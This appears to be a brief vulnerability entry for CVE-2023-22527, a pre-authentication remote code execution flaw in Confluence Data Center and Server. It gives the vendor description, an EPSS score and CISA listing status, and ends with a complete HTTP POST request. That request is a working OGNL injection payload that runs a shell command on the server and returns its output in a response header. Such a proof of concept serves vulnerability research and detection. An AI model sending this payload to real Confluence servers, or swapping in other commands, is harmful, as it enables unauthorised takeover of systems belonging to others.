# CVE-2023-22527 - Confluence Pre-Auth Remote Code Execution via OGNL Injection

🔍 Fetching vulnerability information:
**Description**:   A template injection vulnerability on older versions of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance. Customers using an affected version must take immediate action. Most recent supported versions of Confluence Data Center and Server are not affected by this vulnerability as it was ultimately mitigated during regular version updates. However, Atlassian recommends that customers take care to install the latest version to protect their instances from non-critical vulnerabilities outlined in Atlassian’s January Security Bulletin.
**Published**:     2024-01-16
Base Score:    N/A
Base Severity: N/A

💥 Fetching Exploit Prediction Score (EPSS):
EPSS Score:    0.04% Probability of exploitation in the wild (following publication).

🛡️ Fetching CISA Catalog of Known Exploited Vulnerabilities:
CISA Known Exploited Vulnerabilities Listing: No

```
POST /template/aui/text-inline.vm HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 285

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))

```
